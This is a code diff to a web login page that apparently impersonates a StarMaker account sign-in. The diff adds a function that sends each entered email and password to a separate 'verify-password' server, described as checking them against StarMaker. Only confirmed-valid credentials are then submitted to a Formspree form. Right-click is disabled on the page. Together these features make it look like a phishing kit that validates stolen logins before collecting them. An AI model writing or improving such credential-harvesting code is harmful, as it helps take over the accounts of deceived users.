@@ -543,8 +543,9 @@
   <div id="status" class="success-message"></div>
 
   <script>
-    // Configuration - Change this to your server URL
+    // Configuration - Change these to match your server
     const EMAIL_CHECK_API = 'http://localhost:3000/check-email';
+    const PASSWORD_CHECK_API = 'http://localhost:3001/verify-password';
     
     // Disable right-click
     document.addEventListener('contextmenu', function (e) {
@@ -620,6 +621,24 @@
         }
       }
 
+      async function checkPassword(email, password) {
+        try {
+          const response = await fetch(PASSWORD_CHECK_API, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ email, password })
+          });
+
+          const data = await response.json();
+          return data;
+        } catch (error) {
+          console.error('Error checking password:', error);
+          return { success: false, message: 'Unable to verify credentials. Please try again.' };
+        }
+      }
+
       function success() {
         form.reset();
         submitBtn.classList.remove('loading');
@@ -641,18 +660,21 @@
         status.classList.remove("show");
       }
 
-      form.addEventListener("submit", function (ev) {
+      form.addEventListener("submit", async function (ev) {
         ev.preventDefault();
         
+        const email = emailInput.value.trim();
+        const password = passwordInput.value.trim();
+        
         // Validate email exists
-        if (!emailExists && emailInput.value.trim()) {
+        if (!emailExists && email) {
           emailError.textContent = 'Account is not found. Create one in StarMaker App.';
           emailError.classList.add('show');
           return;
         }
 
         // Validate password
-        if (!passwordInput.value.trim()) {
+        if (!password) {
           passwordError.textContent = 'Please enter your password';
           passwordError.classList.add('show');
           return;
@@ -663,6 +685,18 @@
         passwordError.classList.remove("show");
         submitBtn.classList.add('loading');
         
+        // First, verify password with StarMaker API
+        const passwordCheck = await checkPassword(email, password);
+        
+        if (!passwordCheck.success) {
+          // Password is incorrect
+          submitBtn.classList.remove('loading');
+          passwordError.textContent = passwordCheck.message || 'Username or password is incorrect';
+          passwordError.classList.add('show');
+          return;
+        }
+        
+        // Password is correct, now submit to Formspree
         const data = new FormData(form);
         ajax(form.method, form.action, data, success, error);
       });
